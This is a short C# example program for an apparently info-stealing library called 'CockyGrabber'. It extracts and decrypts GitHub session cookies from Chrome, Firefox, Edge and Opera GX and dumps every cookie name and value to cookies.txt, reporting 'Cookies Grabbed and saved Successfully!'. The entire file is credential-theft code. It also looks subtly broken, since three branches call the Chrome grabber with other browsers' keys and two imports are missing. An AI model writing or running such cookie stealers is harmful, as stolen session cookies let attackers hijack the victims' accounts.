using CockyGrabber;
using System;
namespace GrabberExamples
{
    class Program
    {
        static void Main(string[] args)
        {
            StringBuilder githubCookies = new StringBuilder();
            
            ChromeGrabber cg = new ChromeGrabber(); FirefoxGrabber fg = new FirefoxGrabber(); EdgeGrabber eg = new EdgeGrabber(); OperaGxGrabber og = new OperaGxGrabber();
            if (cg.CookiesExists())
            {
                foreach (var item in cg.GetCookiesByHostname(".github.com", cg.GetKey()))
                {
                    githubCookies.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                }
            }
            if (fg.CookiesExists())
            {
                foreach (var item in cg.GetCookiesByHostname(".github.com", fg.GetKey()))
                {
                    githubCookies.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                }
            }
            if (eg.CookiesExists())
            {
                foreach (var item in cg.GetCookiesByHostname(".github.com", eg.GetKey()))
                {
                    githubCookies.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                }
            }
            if (og.CookiesExists())
            {
                foreach (var item in cg.GetCookiesByHostname(".github.com", og.GetKey()))
                {
                    githubCookies.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                }
            }
            
            
            File.WriteAllText("cookies.txt", githubCookies.ToString());
            Console.WriteLine("Cookies Grabbed and saved Successfully!");
            Console.ReadKey();
        }
    }
}
